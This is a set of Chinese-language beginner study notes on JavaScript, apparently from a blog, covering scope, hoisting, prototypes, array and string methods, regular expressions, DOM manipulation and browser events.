<h4 id="作用域："><a href="#作用域：" class="headerlink" title="作用域："></a>作用域：</h4><p>一个变量的作用范围<br>全局作用域:<br>直接编写在script标签里面的JS代码，都在全局作用域里面<br>全局作用域在页面打开时创建，在页面关闭时销毁<br>在全局作用域中有一个全局对象window,代表的是浏览器的窗口，由浏览器创建，是可以直接使用的<br>在全局作用域中，创建的变量都会作为window对象的属性保存<br>创建的函数都会作为window对象的方法保存<br>在全局作用域下,var a&#x3D;10相当于window.a&#x3D;10;<br>function fun(){}  相当于 window.fun&#x3D;function(){}<br>在全局作用域下的变量都称为全局变量，在页面的任意位置都可以访问的到</p>
<p>函数作用域:<br>调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁<br>每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的<br>在函数作用域中可以访问到全局作用域下的变量，但是在全局作用域中无法访问到函数作用域下的变量<br>当在函数作用域操作一个变量时，它会先在自身作用域查找，如果有就直接使用，如果没有，就向上一级作用域中查找，知道找到全局作用域<br>如果全局作用域中依然没有找到，则会报错<br>在函数中要访问全局变量可以使用window对象<br>函数作用域中也有声明提前的特性，使用var 关键字声明的变量，会在函数中所有代码执行之前被声明<br>函数声明也会在函数中所有代码执行之前执行<br>在函数中，不使用var声明的变量都都成为全局变量 相当于window.变量&#x3D;…<br>定义形参就相当于在函数作用域中声明了变量</p>
<p>内部可以看到外部(通过作用域链)，但外部看不到内部<br><br/></p>
<h4 id="声明提前"><a href="#声明提前" class="headerlink" title="声明提前:"></a>声明提前:</h4><p>使用var关键字声明的变量，会在所有的代码执行之前被声明<br>console.log(a);<br>var a&#x3D;10；undefined<br>上面2行等价于<br>var a;<br>console.log(a);<br>a&#x3D;10;<br>如果声明变量时不使用var关键字，则变量不会被声明提前。<br>console.log(a);<br>a&#x3D;10;报错</p>
<p>函数声明:<br>fun();<br>fun2();报错<br>function fun(){alert(1);} 函数声明会被提前创建<br>var fun2&#x3D;function(){}函数表达式不会被提前创建(这里只是把变量提前了，赋值操作没有提前)<br>上面4行相当于<br>function fun(){alert(1);}<br>var fun2;<br>fun();<br>fun2();<br>fun2&#x3D;function(）{};<br><br/></p>
<h4 id="关于this"><a href="#关于this" class="headerlink" title="关于this:"></a>关于this:</h4><p>解析器在调用函数时，每次都会向函数内部传递一个隐含的参数，这个隐含的参数就是this,this指向的是一个对象，这个对象被称为 函数执行的上下文对象，根据函数的调用方式不同，this会指向不同的对象<br>以函数的形式调用,this永远都是window<br>以方法的形式调用，this就是调用方法的那个对象<br>以构造函数的形式调用，this就指向被创建出来的那个对象<br>使用call与apply方法调用时.this是指定的那个对象<br><br/></p>
<h4 id="使用工厂模式创建对象"><a href="#使用工厂模式创建对象" class="headerlink" title="使用工厂模式创建对象:"></a>使用工厂模式创建对象:</h4><p>返回一个对象的函数<br>通过该方法可以大批量的创建对象，节省代码<br>使用工厂模式创建的对象，使用的构造函数都是Object<br>所以创建的对象都是Object这个类型，就导致无法区分多种不同类型的对象<br>function createPerson(name,age){<br>var obj&#x3D;new Object();<br>obj.name&#x3D;name;<br>obj.age&#x3D;age;<br>return obj;<br>}</p>
<p>var obj1&#x3D;createPerson(…);<br>var obj2&#x3D;createPerson(…);</p>
<p>obj1 instanceof Object：true<br>obj1 instanceof Object： true<br><br/></p>
<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数:"></a>构造函数:</h4><p>构造函数就是一个普通的函数，创建方式与普通函数没有区别<br>不同的是构造函数首字母大写</p>
<p>构造函数与普通函数的区别就是调用方式的不同<br>普通函数是直接调用，构造函数需要使用new关键字调用</p>
<p>构造函数的执行流程(即 new …()期间发生的事情)<br>1 立刻创建一个新的对象<br>2 将新建的对象作为函数中的this<br>3 逐行执行函数中的代码<br>4 将新建立的对象作为返回值返回</p>
<p>使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类<br>通常将通过一个构造函数创建的对象，称为是该类的实例</p>
<p>可以使用instanceof检查一个对象是否是一个类的实例,如果是，返回true,否则返回false<br>var per&#x3D;new Person();<br>per instanceof Person<br>所有的对象都是Object的后代，所以任何对象和instanceof做检查都会返回true</p>
<p>构造函数每执行一次就会创建一个新的对象，但是方法都是一样的，浪费资源，应该让所有对象共享一个方法<br>function Person(){<br>this.sayName&#x3D;function（）{}<br>}<br>var per1&#x3D;new Person();<br>var per2&#x3D;new Person();<br>per1.sayName&#x3D;&#x3D;per2.sayName;false</p>
<p>将上面改成<br>function Person(){<br>this.sayName&#x3D;fun;<br>}<br>function fun(){<br>alert(1);<br>}<br>将函数定义在全局作用域里面，污染了全局作用域的命名空间(可能其他人也不知道，起了相同的名字，于是这个就被覆盖掉了)<br><br/></p>
<h4 id="自定义构造函数-原型的组合模式："><a href="#自定义构造函数-原型的组合模式：" class="headerlink" title="自定义构造函数+原型的组合模式："></a>自定义构造函数+原型的组合模式：</h4><p>套路:自定义构造函数，属性在函数中初始化,方法添加到原型链上<br>使用场景:需要创建多个类型确定的对象<br>如： function Person(name,age){<br>this.name&#x3D;name;<br>this.age&#x3D;age;<br>}<br>Person.prototype.setName&#x3D;function(name){<br>this.name&#x3D;name;这里的this是指向实例对象<br>}</p>
<p>var person1&#x3D;new Person（）;<br>person1 instanceof Person :true<br>var person2&#x3D;new Person(); </p>
<p>如果把方法写在构造函数里面，那么person1,person2的方法是不同的，会造成浪费内存，而放在原型链上，则2个对象的方法是同一个</p>
<p>function  Animal(){…}<br>var animal1&#x3D;new animal();<br>animal1 instanceof animal:true</p>
<h4 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象:"></a>原型对象:</h4><p>构造函数名.prototype  为显示原型属性<br>实例对象.<strong>proto</strong>    为隐式原型属性<br>这两个都是指向同一个原型对象 </p>
<p>原型prototype：<br>我们所创建的每一个属性，解析器都会向函数中添加一个属性prototype,这个属性(保存了一个地址)对应着一个对象，这个对象就是所谓的原型对象（默认是一个object的空对象）(如：空间地址为0x123)。<br>原型对象有一个属性constructor，它指向函数对象<br>如果函数作为作为普通函数调用,那么prototype没有任何作用。<br>当函数以构造函数的形式调用时，它所创建的对象中都会有一个隐含的属性，指向该构造函数的原型对象，即 创建出来的那个对象的__proto__属性也是保存了一个地址，指向了同一个空间。<br>也就是 对象.<strong>proto</strong>&#x3D;&#x3D;函数.prototype<br>原型对象就像一个公共区域，所有同一个类的实例都可以访问到这个原型对象<br>可以将对象中公有的内容都设置在原型对象中<br>向MyClass构造函数中添加属性a（这个是在公共区间中存入a,并不是单个的实例中存入）<br>MyClass.a&#x3D;….</p>
<p>当我们访问对象的一个属性或者方法时，它会现在对象自身中查找，如果有则直接使用，如果没有，则会去原型对象中寻找,如果找到则直接使用。</p>
<p>向原型中添加方法<br>MyClass.prototype.sayName&#x3D;function(){} 这样既是公共的方法，也不会污染全局作用域的命名空间<br>使用 in 检查对象中有没有某个属性时，如果对象中没有，但原型中有，也会返回true<br>可以使用对象中的hasOwnProperty来检查 对象自身 有没有该属性<br>像  实例.<strong>proto</strong>.hasOwnProperty(“hasOwnProerty”):false</p>
<p>原型对象也是对象，它也有原型，如果原型中没有，则去原型对象的原型中寻找，也就是<br>函数名.prototype.__proto__或者是实例.<strong>proto</strong>.<strong>proto</strong></p>
<p>上面这个属性是在原型的原型中<br>而原型的原型的原型(3个)是指向空,即<br>函数名.prototype.<strong>proto</strong>.<strong>proto</strong>&#x3D;null<br>实例.<strong>proto</strong>.<strong>proto</strong>.<strong>proto</strong>&#x3D;null</p>
<p>原型对象也是对象，它也有原型，如果原型中没有，则去原型对象的原型中寻找，也就是<br>函数名.prototype.__proto__或者是实例.<strong>proto</strong>.<strong>proto</strong>,<br>如果原型的原型中也没有，则知道找到Object对象（所有对象的祖先,也就是原型的原型）的原型<br>Object对象的原型(即原型的原型 的原型)没有原型，如果在Object中依然没有找到，则返回undefined</p>
<p>原型对象(0x123)<br>a           100<br><strong>proto</strong>   0x124(这个指向下面,如果上面没有找到对象的属性，就去这个指向空间里找)</p>
<p>原型对象的原型对象<br><strong>proto</strong><br>object的原型对象的隐式原型为null,所以object的原型对象是原型链的尽头<br>实例才有隐式原型 <strong>proto</strong><br>函数只有显示原型  prototype<br>Function.prototype是一个实例<br><br/></p>
<h4 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法:"></a>toString方法:</h4><p>当我们直接在页面中打印出一个对象时，实际上是输出对象的toString()方法的返回值<br>如果希望在输出对象时不输出[object Object],可以为对象添加一个toString方法<br>对象.toString&#x3D;function(){}<br>但这样只能改变一个实例<br>应该  构造函数名.prototype.toString&#x3D;function（）{} 添加一个方法<br><br/></p>
<h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收:"></a>垃圾回收:</h4><p>var obj&#x3D;new Object();<br>这里开辟了一个内存空间<br>obj这个变量保存了这个空间的引用地址<br>但当执行  obj&#x3D;null时<br>这个变量和这个空间的链接就断开了<br>那么这个空间不被任何变量所指向，也就成垃圾了<br>这种对象过多会占用大量的内存空间，导致程序运行变慢<br>在JS中拥有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁<br>我们不需要也不能进行垃圾回收的操作</p>
<p>如果需要回收 就执行null操作，让浏览器自动将这些垃圾对象销毁<br><br/></p>
<h4 id="数组简介"><a href="#数组简介" class="headerlink" title="数组简介:"></a>数组简介:</h4><p>数组也是对象<br>和普通对象功能类似，也是用来存储一些值的<br>不同的是，普通对象是使用字符串作为属性值，而数组是使用数字作为索引来操作元素<br>索引:从0开始的整数<br>创建数组对象: var obj&#x3D;new Array();<br>使用typeof检查一个数组时，会返回object<br>向数组中添加元素:数组[索引]&#x3D;值<br>如果读取不存在的值，不会报错，而是返回undefined</p>
<p>获取数组的长度 数组.length<br>对于非连续的数组,使用length会获取到数组的最大索引+1<br>尽量不要创建非连续的数组<br>如果修改的lenth大于原长度，则多出部分会空出来<br>如果修改的length小于原长度，则多出的元素会被删除<br>向数组的最后一个位置添加元素 arr[arr.length]&#x3D;…</p>
<p>存值还可以 arr.hello&#x3D;”hello” 但没有意义<br>还可以使用字面量创建数组<br>var arr&#x3D;[];<br>使用构造函数创建数组时，也可以同时添加元素，元素之间用,隔开<br>new Array(10,20,30);</p>
<p>arr&#x3D;[10];表示只用一个元素，这个元素内容为10<br>new Array(10) 表示数组的长度为10,10个元素的内容暂时为空</p>
<p>arr.push(1,2,3)向数组中添加新的元素，这些元素将自动添加到数组的末尾，并返回新的长度<br>arr.pop()删除数组的最后一个元素，并将删除的值作为返回值<br>arr.unshift() 向数组的开头添加一个或者多个元素，并且返回新的数组长度，向前面插入元素以后，后面的元素的索引会依次改变<br>arr.shift() 删除数组的第一个元素，并将删除掉的元素作为返回值</p>
<p>forEach方法需要一个函数作为参数,像这种函数，由我们创建但不由我们调用的（由浏览器自己调用的），称为回调函数。<br>数组中有几个元素，这个函数就会执行几次<br>浏览器会在回调函数中传递三个参数，a为正在遍历的元素，b为正在遍历的元素的索引，第三个参数就是正在遍历的数组<br>arr.forEach(function(a,b,c){<br>})</p>
<p>arr.slice(a,b)可以用来从数组中提取指定元素,a为起始位置 b为末端位置，但截取的内容不包括末端的那个元素<br>该方法不会改变元素数组，而是将截取到的元素封装到一个新数组中返回</p>
<p>arr.slice(a) 截取从索引a开始以后的所有元素，索引可以传递一个负值,如-1就是倒数第一个</p>
<p>arr.splice(m,n)可以用来删除数组中的指定元素 m起始，n表示删除的数量，并将被删除的元素作为返回值返回 会改变原数组<br>arr.splice(m,n,k)第三个元素及以后，这些元素将替换掉之前被删掉的元素<br>如果n为0，则表示不删，那么k代表的元素还是将插入到开始的位置(索引m的前面)的前面</p>
<p>arr.concat(arr2) 连接两个或者多个数组(也可以是元素)，并将新数组返回，该方法不会对原数组产生影响</p>
<p>arr.filter(（num）&#x3D;&gt;{return true&#x2F;false})<br>函数 function 为必须，数组中的每个元素都会执行这个函数。且如果返回值为 true，则该元素被保留；<br>函数的第一个参数 currentValue 也为必须，代表当前元素的值。filter会返回一个新的数组，不会改变原数组</p>
<p>arr.join()该方法可以将一个数组转换为字符串，<br>该方法不会改变原数组，而是将转换后得到的字符串作为结果返回<br>还可以指定一个字符串作为参数，该字符串会作为元素之间的连接符<br>如果不适用连接符，默认会使用,作为连接符<br>如果连，也不想要，可以指定空字符串 “”</p>
<p>arr.reverse() 会翻转数组 前后颠倒过来<br>会改变原数组</p>
<p>arr.sort()  对数组进行排序<br>会改变原数组 默认会按照unicode编码来进行排序<br>即使对于纯数字的数组，也会按照unicode编码来进行排序，所以对数字进行排序时，可能会得到错误的结果<br>也可以自己来指定排序的规则<br>可以在sort()中放一个回调函数来指定排序规则<br>a，b代表数组中的连续的某两个元素<br>并且a代表的元素的位置一定在b代表的元素的前面<br>浏览器会根据元素的返回值来决定元素是否会交换位置<br>如果大于0 元素会交换位置<br>如果小于0 元素不变<br>如果等于0 则认为两个元素相等，也不交换位置<br>arr.sort(function(a,b){<br>如果升序<br>if(a&gt;b){<br>return 1;<br>}else if(a&lt;b){<br>return -1;<br>}else{<br>return 0<br>}<br>如果降序:<br>if(a&gt;b){<br>return -1;<br>}else if(a&lt;b){<br>return 1;<br>}else {<br>return 0;<br>}</p>
<p>})</p>
<p>当遇到数组对象时<br>arr.sort((p1,p2)&#x3D;&gt;{ 降序:后 减 前      升序:前 减 后<br>return sortType&#x3D;&#x3D;1?p2.age-p1.age(根据年龄降序):p1.age-p2.age(根据年龄升序)</p>
<p>})<br><br/></p>
<h4 id="call与apply"><a href="#call与apply" class="headerlink" title="call与apply:"></a>call与apply:</h4><p>这两个方法都是函数对象的方法，需要通过函数对象来调用<br>当函数调用call()和apply()都会让函数执行<br>可以将一个对象指定为第一个参数，这个对象将成为函数执行时的this<br>call方法中实参是在对象之后(第一个参数以后)依次传递<br>fun.call(obj,1,2)<br>apply方法中实参在对象之后需要以数组的形式传递<br>apply(obj,[1,2])<br><br/></p>
<h4 id="arguments"><a href="#arguments" class="headerlink" title="arguments:"></a>arguments:</h4><p>当调用函数时，浏览器每次都会传递进两个隐含的参数:<br>1 函数的上下文对象this<br>2 封装实参的对象arguments<br>arguments是一个类数组对象，可以通过索引来操作数据<br>当调用函数时，所用的实参都会在arguments中保存<br>arguments.length可以获取实参的长度<br>arguments.callee这个属性对应一个函数对象，就是当前正在执行的函数的对象<br><br/></p>
<h4 id="Date对象"><a href="#Date对象" class="headerlink" title="Date对象:"></a>Date对象:</h4><p>在JS中使用Date对象来表示一个时间<br>如果直接使用构造函数创建一个Date对象，则会封装成当前代码执行的时间<br>var d&#x3D;new Date()<br>创建一个指定的时间对象:需要在构造函数中传递一个表示时间的字符串作为参数<br>日期的格式:月&#x2F;日&#x2F;年 时:分:秒<br>new Date(“12&#x2F;03&#x2F;2016 11:10:13”);<br>d.getDate() 获取当前日期是几号<br>d.getDay()  获取当前日期是星期几 会返回一个0-6的值，0表示周日，1表示周一<br>d.getMonth() 获取当前时间的月份 0-11的值 0表示1月 1表示2月  11表示12月<br>d.getFullYear() 获取当前日期对象的年份<br>d.getTime() 获取当前日期对象的时间戳<br>时间戳：从格林威治标准时间的1970年1月1日 0时0分0秒到当前日期所花费的毫秒数(1s&#x3D;1000ms<br>)<br>计算机底层在保存时间时使用的都是时间戳<br>Date.now() 获取当前代码执行时的时间戳<br>可以利用时间戳来测试代码执行的性能<br><br/></p>
<h4 id="Math"><a href="#Math" class="headerlink" title="Math:"></a>Math:</h4><p>不是构造函数<br>里面封装了数学相关计算的一些属性和方法<br>Math.PI 圆周率 常量<br>Math.abs() 计算一个数的绝对值<br>Math.ceil() 可以对一个数进行向上取整，小数位只要有值就会向上进1<br>Math.floor() 可以对一个数进行向下取整，小数部分会被省掉<br>Math.round() 四舍五入取整<br>Math.random() 可以生成一个0到1之间的随机数 包括0  但不包含1<br>若要随机出现0到10(包括0和10)的数<br>Math.round(Math.random()*10)<br>若要生成0到x之间的随机数<br>Math.round(Math.random()*x)<br>若要生成1到10的数<br>Math.round(Math.random()*9+1)</p>
<p>生成一个x到y之间的随机数:<br>Math.round(Math.random()*(y-x)+x)</p>
<p>Math.max(1,10,5) 可以获取多个数中的最大值<br>Math.min()  可以获取多个数中的最小值</p>
<p>Math.pow(2,2) 4 可以获取一个数的几次方<br>Math.sqrt(4) 2 可以对一个数进行开方<br><br/></p>
<h4 id="包装类"><a href="#包装类" class="headerlink" title="包装类:"></a>包装类:</h4><p>主要是给浏览器自己用的<br>String() Number() Boolean()<br>通过包装类可以将基本数据类型转化为对象<br>var a&#x3D;new Number(1)<br>new String(“123”)<br>new Boolean(true)<br>用typeof 检测后都是object</p>
<p>转换为对象后有一个好处，可以添加属性<br>a.hello&#x3D;”123”;</p>
<p>当我们对一些基本数据类型调用一些属性和方法时,浏览器会临时使用一些包装类将其转换为对象，然后再调用对象的属性和方法，调用完以后，再将其转换为基本数据类型<br>所以<br>var s&#x3D;123;<br>s&#x3D;s.toString();<br>s.hello&#x3D;”你好”; 这里是添加到临时的对象里了，添加完后，这个对象就销毁了<br>console.log(s.hello) undefined  </p>
<p>上面一共转换了两次对象<br>s.toString()1次<br>s.hello 1次  但这两个不是同一个<br>这上面两个都是临时转换为对象，然后被销毁<br><br/></p>
<h4 id="字符串的方法"><a href="#字符串的方法" class="headerlink" title="字符串的方法:"></a>字符串的方法:</h4><p>var str&#x3D;”hello”<br>在底层 字符是以字符数组的形式保存的<br>[‘h’,’e’,’l’]<br>str.charAt(0) h 可以返回字符串中指定位置的字符<br>str.charCodeAt(1) 获取指定位置的字符的字符编码（uniCode编码）</p>
<p>String.fromCharCode(72)  可以根据字符编码去获取字符 ‘H’<br>str.concat(“你好”,”再见”) 可以用来链接两个或多个字符串<br>str.indexOf(“h”) 可以用来检查一个字符串中含有指定内容，如果有，则返回其出现的第一次的索引，如果没有找到指定的内容，则返回-1 (特殊情况:’abc’.indexOf(“”): 0 ,当input框中值全删完，默认为空字符串)<br>str.indexOf(“h”,1) 可以指定第二个参数，指定开始查找的位置，返回的还是索引<br>str.lastIndexOf(“h”) 从后往前面找<br>str.lastIndexOf(“h”，5) 也可以指定位置</p>
<p>str.slice(1,2)  可以从字符串中截取指定的内容，不会影响原字符串，而是将截取到的内容返回<br>参1: 开始位置的索引，包括开始的位置<br>参2:结束位置的索引，不包括结束位置</p>
<p>如果省略第二个，则会截取到开始位置以后所有的<br>str.slice(1,-1) -1表示倒数第一个，截取原则还是不变</p>
<p>str.substring()  可以用来截取一个字符串，和slice类似<br>参1 :开始截取位置的索引，包括开始位置<br>参2:结束位置的索引，不包括结束位置<br>不同的是 这个不能接收负值作为参数<br>如果是负值，则默认使用0，并且如果第二个参数小于第一个，还会互换位置</p>
<p>str.substr() 截取指定位置的内容<br>参1:开始位置的索引<br>参2:截取的数量</p>
<p>str.split()<br>可以将一个字符串拆分成一个数组<br>参数:需要一个字符串作为参数，将会根据这个字符串去拆分成数组<br>如果传递一个空串作为参数表，则会将每个字符拆分成数组中的一个元素<br>var str&#x3D;”abc,def,g”<br>str.split(“,”);[“abc”,”def”,”g”]<br>str.split(“d”) [“abc,”,”ef,g”] 两个元素</p>
<p>str.toUpperCase() 将一个字符串转换为大写并返回<br>str.toLowerCase() 将一个字符串转换为小写并返回<br><br/></p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式:"></a>正则表达式:</h4><p>用来定义一些字符串的规则<br>创建正则表达式的对象<br>var reg&#x3D;new RegExp(“正则表达式”,”匹配模式”);</p>
<p>只要字符串中有a,严格区分大小写,就返回true<br>var reg&#x3D;new RegExp(“a”); reg： &#x2F;a&#x2F;</p>
<p>在构造函数中可以传递一个匹配模式作为第二个参数<br>可以是:<br>i 忽略大小写<br>g 全局匹配模式</p>
<p>var reg&#x3D;new RegExp(“a”,”i”)</p>
<p>var str&#x3D;”a”;<br>test（）  用来检测一个字符串是否符合正则表达式的规则，符合就返回true,反之则返回false<br>reg.test(str); 使用reg这个规则去测试str这个字符串</p>
<p>使用字面量来创建正则表达式<br>var 变量&#x3D;&#x2F;正则表达式&#x2F;匹配模式<br>var reg&#x3D;&#x2F;a&#x2F;i  和上面是一样的</p>
<p>使用|表示或者的意思<br>reg&#x3D;&#x2F;a|b&#x2F; 有其中一个就会返回true</p>
<p>[]也是或的关系<br>reg&#x3D;&#x2F;[ab]&#x2F;<br>优势 &#x2F;[a-b]&#x2F; 表示任意小写字母 [A-B] 任意大写字母 [A-z] 任意字母</p>
<p>reg&#x3D;&#x2F;a[bde]c&#x2F; 表示是否含有 abc或者adc或者aec</p>
<p>[^] 除了<br>reg&#x3D;&#x2F;[^ab]&#x2F; 字符串中如果有ab之外的字符就返回true,如果没有则返回false</p>
<p>[0-9] 任意的数字</p>
<p>split() 可以传递一个正则表达式作为参数，默认是全局匹配<br>var str&#x3D;”1a2b3c4D5”<br>var reg&#x3D;&#x2F;A-z&#x2F;<br>str&#x3D;str.split(reg) [“1”,”2”,”3”,”4”,”5”]</p>
<p>search()可以指定字符串中是否含有指定内容,如果搜索到指定内容，会返回第一个字母的索引，如果没有则返回-1,还可以接收一个正则表达式作为参数，根据这个来检索字符串<br>默认只会查找第一个<br>str.search(“abc”)<br>str.search(&#x2F;a[bef]c&#x2F;)</p>
<p>match()  可以根据正则表达式，将符合条件的内容找出来，默认情况下，只会找到第一个符合条件的内容，找到以后就停止检索，match还会将匹配到的内容封装到一个数组中返回，即使只查询到一个结果<br>需要设置匹配模式为全局，才会将所有内容取出来<br>str.match(&#x2F;[A-z]&#x2F;);<br>str.match(&#x2F;a-z&#x2F;gi)</p>
<p>replace()  可以将字符串中指定的内容替换为新的内容,默认只会替换第一个<br>参数1 ：被替换的内容 可以接收一个正则表达式作为参数<br>参数2：  新的内容<br>str.replace(“a”,”@<em>@”)<br>str.replace(&#x2F;a&#x2F;g,”@</em>@”)<br>str.replace(&#x2F;[A-z]&#x2F;g,””) 直接删除字母</p>
<p>量词:可以设置一个内容出现的次数<br>{n}：正好出现n次<br>var str&#x3D;&#x2F;a{3}&#x2F;<br>量词只对前面的一个内容其作用<br>&#x2F;ab{3}&#x2F;  指的是  abbb<br>但可以这样 &#x2F;(ab){3}&#x2F;  这就表示 ababab<br>{m,n} 可以出现m到n次<br>{m,}  出现m次及以上<br>&#x2F;ab{1,3}c&#x2F; b可以出现1到3次</p>
<p>加号代表 至少一个  &gt;&#x3D;1<br>&#x2F;ab+c&#x2F;<br>星号代表0个或多个<br>&#x2F;ab*c&#x2F;<br>问号代表0个或1个<br>&#x2F;ab?c&#x2F;</p>
<p>^ 以什么开头<br>&#x2F;^a&#x2F;<br>$ 以什么结尾<br>&#x2F;a$&#x2F;</p>
<p>&#x2F;^a$&#x2F;  开头又结束代表只能有一个a</p>
<p>&#x2F;.&#x2F; 表示任意字符，除了换行和结束符</p>
<p>在正则表达式中可以使用\表示转义字符<br>&#x2F;.&#x2F;  表示.</p>
<p>reg&#x3D;/&#x2F;\ 表示一个\</p>
<p>reg.test(“b.\“)  true  这里字符串中的\也转义了，实际上是一个\ （\在字符串中也是一个转义字符）</p>
<p>\w：任意字母,数字,_ [A-z0-9_]<br>\W：除了 字母，数字,_ [^A-z0-9_]<br>\d：任意的数字 [0-9]<br>\D：除了数字<br>\s：空格<br>\S:除了空格<br>（） 是为了提取匹配字符串的，表达式中有几个()就有几个相应的匹配字符串</p>
<p>\b：单词边界<br>&#x2F;\bchild\b&#x2F;  表示child为一个独立的单词 前面和后面一个位置都有空格 或后面什么都没有<br>\B：除了单词边界</p>
<p>去除字符串中的空格<br>str&#x3D;str.replace(&#x2F;\s&#x2F;g,”_”)</p>
<p>去除开头的空格<br>str&#x3D;str.replace（&#x2F;^\s*&#x2F;，” “）<br>去除结尾的空格<br>str&#x3D;str.replace(&#x2F;\s*$&#x2F;,” “)<br>去除开头和结束的空格<br>str&#x3D;str.replace(&#x2F;^\s*|\s*$&#x2F;g,” “)</p>
<br/>

<h4 id="文档的加载"><a href="#文档的加载" class="headerlink" title="文档的加载:"></a>文档的加载:</h4><p>浏览器在加载一个页面时，是按照自上向下的顺序加载的，读取到一行就运行一行<br>如果将script标签写在页面的上面,代码执行时，页面还没有加载<br>onload事件会在整个页面加载完成之后触发<br>window.onload&#x3D;function(){} 这个可以确保当代码执行时所有dom对象已经加载完毕<br><br/></p>
<h4 id="dom查询"><a href="#dom查询" class="headerlink" title="dom查询:"></a>dom查询:</h4><p>下面五个通过 document对象(在整个页面查询)调用<br>getElementById() 通过id获取一个元素节点对象</p>
<p>getElementsByTagName() 通过标签名获取一组元素节点对象</p>
<p>getElementsByName() 通过name属性获取一组元素节点对象</p>
<p>getElementsByClassName()  通过class属性获取一组元素节点对象</p>
<p>querySelector(“.box1&gt;div1”) 里面放css选择器</p>
<p>querySelectorAll(“”)</p>
<p>元素.id 元素.name 元素.value<br>读取class时:元素.className<br>s<br>下面四个通过具体的元素（在指定的元素中查询）节点调用</p>
<p>方法:getElementsByTagName() </p>
<p>属性:childNodes  当前节点的所有子节点(包含文本节点（空格）， 元素节点)</p>
<p>属性:firstNode  当前节点的第一个子节点</p>
<p>属性:lastChild  当前节点的最后一个子节点</p>
<p>属性:children  获取当前元素的所有子元素</p>
<p>属性:firstElementChild 获取当前元素的第一个子元素</p>
<p>属性:parentNode 获取当前节点的父节点</p>
<p>属性:previosSibling 表示当前节点的前一个兄弟节点</p>
<p>属性:previosElementSibling 表示当前节点的前一个兄弟元素节点</p>
<p>属性:nextSibling  表示当前节点的后一个兄弟节点</p>
<p>属性:innerHTML  可以获取到元素内部的文本内容</p>
<p>属性:innerText  同上,但获取不到标签元素</p>
<p>属性：nodeValue 获取节点内容</p>
<p>获取body：document.body<br>或者  document.getElementsByTagName(“body”)[0]</p>
<p>获取html根标签:document.documentElement</p>
<p>获取页面中所有的元素: document.all<br>或者  document.getElementsByTagName(“*”）<br><br/><br>dom的增删改<br> document.createElement(“li”)  创建一个元素节点对象，需要一个标签名作为参数，并根据该标签名创建元素节点对象，并将创建好的对象作为返回值返回<br> document.createTextNode(“你是啥子”) 创建文本节点对象</p>
<p>父元素.appendChild(“”)  向一个父节点中添加一个子节点<br>（父节点.innerHtml+&#x3D;”<li>cat</li>“一样的效果）（有时会有隐患）<br>父元素.insertBefore(a1,a2)  a1为新节点，a2为指定节点 可以在指定的子节点前插入新的子节点<br>父元素.replaceChild(新节点，旧节点)  可以使用新节点替换已有的子节点<br>父元素.removeChild(子节点) 可以删除一个子节点<br><br/></p>
<h4 id="操作内联样式"><a href="#操作内联样式" class="headerlink" title="操作内联样式:"></a>操作内联样式:</h4><p>通过style属性设置和读取的样式都是内联样式<br>元素.style.width&#x3D;”300px”<br>元素.style.backgroundColor&#x3D;”yellow” 需要将样式名改为驼峰命名的写法</p>
<p>读取样式 (但通过style无法读取样式表中的样式)<br>元素.style.backgroundColor<br><br/>  </p>
<h4 id="获取元素的样式"><a href="#获取元素的样式" class="headerlink" title="获取元素的样式:"></a>获取元素的样式:</h4><p>读取当前元素正在显示的样式:元素.currentStyle.width（这个只有IE支持）<br>在其他浏览器中可以使用getComputedStyle(元素,null)来获取当前样式，返回的是一个对象，读取样式:对象.样式名<br>上面这两个都是只读，不能修改，<br>而修改必须要用style属性<br><br/></p>
<h4 id="其他样式相关的属性"><a href="#其他样式相关的属性" class="headerlink" title="其他样式相关的属性:"></a>其他样式相关的属性:</h4><p>元素.clientWidth  可见宽   没有单位(包括内容区和内边距) 只读属性<br>元素.offsetWidth  包括内容区，内边距，边框  没有单位<br>offsetParent  会获取到离当前元素最近的并且开启了定位的祖先元素<br>offsetLeft 当前元素相对于其定位元素的水平偏移量<br>scollWidth  滚动区域的高度<br>scrollLeft  获取水平滚动条滚动的距离<br>说明垂直滚动条到底了: scrollHeight-scrollTop&#x3D;clientHeight<br>元素.onscroll&#x3D;function(){}滚动条的滚动事件<br>input.disabled&#x3D;true 设置元素禁用<br>input.disabled&#x3D;false  设置元素可用<br><br/></p>
<h4 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象:"></a>事件对象:</h4><p>onmousemove：在元素内移动时触发<br>事件对象:当事件的响应函数被触发时,浏览器每次都会将一个事件对象作为实参传递进响应函数。事件对象中封装了当前事件相关的所有细节<br>window.event 在ie8以下，还有chrome中将事件对象作为window的属性保存的，<br>在火狐中是作为实参传进来(function(event))</p>
<p>event&#x3D;event||window.event 解决兼容性问题<br><br/></p>
<h4 id="div跟随鼠标移动"><a href="#div跟随鼠标移动" class="headerlink" title="div跟随鼠标移动:"></a>div跟随鼠标移动:</h4><p>document.onmousemove&#x3D;function(event){<br>event&#x3D;event||window.event;<br>var left&#x3D;event.clientX;鼠标在当前的 可见窗口 中的坐标，当页面出现滚动条，容易出现bug<br>var top&#x3D;event.clientY;</p>
<p>var left&#x3D;event.pageX；鼠标相对于整个页面的坐标,这个属性在ie8中不支持</p>
<p>box1.style.left&#x3D;left+”px”;  这里元素需要开启定位才能生效，这里的参照物是整个页面</p>
<p>}<br><br/></p>
<h4 id="事件的冒泡"><a href="#事件的冒泡" class="headerlink" title="事件的冒泡:"></a>事件的冒泡:</h4><p>指事件的向上传导，当后代元素的事件被触发时，它的祖先元素的相同事件也会被触发<br>document.body.onclick&#x3D;function(event){<br>如果要取消冒泡 event.cancelBubble&#x3D;true;<br>或者<br>event.stopPropagation();<br><br/></p>
<h4 id="事件的委派"><a href="#事件的委派" class="headerlink" title="事件的委派:"></a>事件的委派:</h4><p>指事件统一绑定给元素共同的祖先元素,当后代元素身上的事件触发时,会一直冒泡到祖先元素，从而通过祖先元素的响应函数来处理事件</p>
<p>好处:可以减少事件绑定的次数，提高程序的性能<br>event.target 表示事件触发的对象<br><br/></p>
